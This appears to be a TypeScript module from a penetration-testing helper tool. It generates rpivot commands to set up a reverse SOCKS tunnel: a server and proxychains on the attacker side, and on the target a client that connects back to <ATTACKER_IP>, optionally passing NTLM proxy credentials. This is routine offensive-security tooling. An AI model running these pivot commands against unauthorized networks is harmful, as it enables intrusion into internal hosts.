import { RpivotPivot } from "@/app/hooks/useRpivotPivot";
import { PivotCommands } from "@/app/types/tool";

export function resolvePivotCommands(pivot: RpivotPivot): PivotCommands {
  const cmds: PivotCommands = { attacker: [], target: [] };
  let step = 1;

  const attackerIP = pivot.attackerIP?.trim() ? pivot.attackerIP : "<ATTACKER_IP>";

  // Attacker: start the server
  cmds.attacker.push({
    step: step++,
    command: `python2 server.py --server-port ${pivot.attackerPort} --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port ${pivot.socksPort}`,
  });

  // Attacker: proxychains config
  cmds.attacker.push({
    step: step++,
    command: `# Add to /etc/proxychains.conf:\n#    socks4 127.0.0.1 ${pivot.socksPort}`,
  });

  // Attacker: proxychains usage example
  cmds.attacker.push({
    step: step++,
    command: `# Example: proxychains curl http://<INTERNAL_HOST>`,
  });

  // Target: base client command
  let clientCmd = `python2 client.py --server-ip ${attackerIP} --server-port ${pivot.attackerPort}`;

  if (pivot.useNtlm) {
    const proxyIP = pivot.ntlmProxyIP?.trim() ? pivot.ntlmProxyIP : "<PROXY_IP>";
    const proxyPort = pivot.ntlmProxyPort ?? 8080;
    const domain = pivot.ntlmDomain?.trim() ? pivot.ntlmDomain : "<DOMAIN>";
    const user = pivot.ntlmUser?.trim() ? pivot.ntlmUser : "<USER>";
    const password = pivot.ntlmPassword?.trim() ? pivot.ntlmPassword : "<PASSWORD>";

    clientCmd += ` --ntlm-proxy-ip ${proxyIP} --ntlm-proxy-port ${proxyPort} --domain ${domain} --username ${user} --password ${password}`;
  }

  cmds.target.push({
    step: step++,
    command: clientCmd,
  });

  return cmds;
}
